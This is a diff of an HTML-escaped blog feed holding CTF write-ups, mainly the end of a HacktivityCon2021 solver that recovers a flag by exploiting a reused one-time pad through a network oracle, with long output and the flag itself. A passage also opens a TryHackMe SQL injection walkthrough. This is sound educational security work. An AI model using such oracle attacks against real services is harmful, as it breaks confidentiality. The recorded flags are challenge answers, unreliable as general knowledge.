+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_match_index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_match_index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
+                        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_match_index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_match_index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
+                                &lt;span class=&quot;n&quot;&gt;flag_match_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag_match_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+                                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Matched Character:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input_to_encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_match_index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+                                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Next Character to Match:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input_to_encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_match_index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+                                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input_to_encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_match_index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                                        &lt;span class=&quot;c1&quot;&gt;# Close out connection.
+&lt;/span&gt;                                        &lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shutdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                                        &lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+                                        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Flag Found:'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input_to_encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                                        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Below is a snippet of the corresponding output, along with the flag:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(shinris3n㉿kodachi)-[~/sec/CTFs/HacktivityCon2021/N1TP]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python3 ./n1tp.py 
+&lt;span class=&quot;go&quot;&gt;NINA: Hello! I found a flag, look!
+
+Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Data sent: flag{00000000000000000000000000000000}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4edadd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4edadd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+Data sent: flag{00000000000000000000000000000000}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4edadd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4edadd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+Data sent: flag{10000000000000000000000000000000}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4edbdd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4edbdd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+Data sent: flag{20000000000000000000000000000000}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed8dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed8dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+Data sent: flag{30000000000000000000000000000000}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed9dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed9dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+Data sent: flag{40000000000000000000000000000000}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ededd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ededd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+Data sent: flag{50000000000000000000000000000000}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4edfdd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4edfdd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+Data sent: flag{60000000000000000000000000000000}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4edcdd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4edcdd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+Data sent: flag{70000000000000000000000000000000}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4edddd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4edddd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+Data sent: flag{80000000000000000000000000000000}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed2dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed2dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+Data sent: flag{90000000000000000000000000000000}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed3dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed3dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+Matched Character: 9
+Next Character to Match: 0
+Data sent: flag{9a000000000000000000000000000000}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed38c9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed38c9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
+Data sent: flag{9b000000000000000000000000000000}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;...
+...
+...
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036bfeb0ea
+Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a100}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba8b0ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba8b0ea
+Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a110}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b0ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b0ea
+Matched Character: 1
+Next Character to Match: 0
+Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a112}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b2ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b2ea
+Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a113}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b3ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b3ea
+Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a114}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b4ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b4ea
+Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a115}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b5ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b5ea
+Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a116}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b6ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b6ea
+Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a117}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b7ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b7ea
+Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a118}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b8ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b8ea
+Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a119}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b9ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b9ea
+Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a11a}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e1ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e1ea
+Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a11b}
+NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?
+
+      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+NINA: Isn't that cool!?! Want to see it again? 
+      Sorry, I forget already -- what was it you wanted to see again?
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
+Matched Character: b
+Next Character to Match: }
+Flag Found: flag{9276cdb76a3dd6b1f523209cd9c0a11b}
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="HacktivityCon2021" /><summary type="html">Challenge Text:</summary></entry><entry><title type="html">DEF CON 29 - Team NINPWN Red Team Village Competition Results</title><link href="http://0.0.0.0:4000/news/2021/08/08/defcon2021results.html" rel="alternate" type="text/html" title="DEF CON 29 - Team NINPWN Red Team Village Competition Results" /><published>2021-08-08T13:12:41-05:00</published><updated>2021-08-08T13:12:41-05:00</updated><id>http://0.0.0.0:4000/news/2021/08/08/defcon2021results</id><content type="html" xml:base="http://0.0.0.0:4000/news/2021/08/08/defcon2021results.html">&lt;table style=&quot;width:75%&quot;&gt;
 
 	&lt;td&gt;
 	&lt;a href=&quot;https://defcon.org/&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/assets/news/defcon29/dc-29-logo.webp&quot; /&gt;&lt;/a&gt;
@@ -1033,107 +1426,4 @@ Some people seem to have trouble reading this, understandably so. Sorry. The fla
 
 &lt;p&gt;&lt;img src=&quot;/assets/writeups/NahamConCTF2021/c66d60c7816a44508a440b49dde15d7f.png&quot; alt=&quot;c66d60c7816a44508a440b49dde15d7f.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="NahamConCTF2021" /><summary type="html">Challenge Text</summary></entry><entry><title type="html">Audio Support</title><link href="http://0.0.0.0:4000/resources/2020/12/15/audio-support.html" rel="alternate" type="text/html" title="Audio Support" /><published>2020-12-15T22:00:01-06:00</published><updated>2020-12-15T22:00:01-06:00</updated><id>http://0.0.0.0:4000/resources/2020/12/15/audio-support</id><content type="html" xml:base="http://0.0.0.0:4000/resources/2020/12/15/audio-support.html">&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=X0WNQ3UYbJE&quot; target=&quot;_blank&quot;&gt;All The Things&lt;/a&gt;
 &lt;br /&gt;
-&lt;a href=&quot;https://www.youtube.com/watch?v=08vrKZcA6eE&quot; target=&quot;_blank&quot;&gt;P5 OST&lt;/a&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;resources&quot;]" /><category term="resources" /><category term="everything" /><summary type="html">All The Things P5 OST</summary></entry><entry><title type="html">Advent of Cyber 2 - Day 5 (Manual Mode)</title><link href="http://0.0.0.0:4000/writeups/2020/12/05/TryHackMe-AoC2-Day5.html" rel="alternate" type="text/html" title="Advent of Cyber 2 - Day 5 (Manual Mode)" /><published>2020-12-05T22:12:21-06:00</published><updated>2020-12-05T22:12:21-06:00</updated><id>http://0.0.0.0:4000/writeups/2020/12/05/TryHackMe-AoC2-Day5</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2020/12/05/TryHackMe-AoC2-Day5.html">&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/THMlogo.png&quot; width=&quot;225&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2&gt;Someone stole Santa's gift list!&lt;/h2&gt;
-&lt;p&gt;Using sqlmap was a nice and straightforward way of solving this challenge, but I was curious how it could be solved manually.  I saw that others were also interested in the AoC2 Discord channel, so I decided to take a crack at it and share a possible solution.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Taking it from the top for the sake of having a complete walkthrough to the Day 5 challenge, this is the page we’re provided with to start:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/santas_official_forum_frontpage.png&quot; alt=&quot;santas_official_forum_frontpage.png&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;There’s not really much to see in the page source, but as the challenge states to find “Santa’s secret login panel and bypass the login”, we can make some educated guesses (as instructed in the first challenge question) to find the panel at /santapanel:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/santapanel.png&quot; alt=&quot;santapanel.png&quot; /&gt;&lt;/p&gt;
-
